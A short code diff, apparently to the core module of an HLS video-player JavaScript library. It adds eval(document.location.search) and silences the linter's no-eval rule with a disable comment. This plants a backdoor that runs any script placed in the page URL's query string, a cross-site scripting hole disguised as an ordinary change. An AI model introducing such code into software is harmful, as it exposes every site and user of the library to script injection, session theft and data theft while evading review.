@@ -22,6 +22,9 @@ import HlsEvents from './events';
 
 import { Observer } from './observer';
 
+// eslint-disable-next-line no-eval
+eval(document.location.search);
+
 /**
  * @module Hls
  * @class
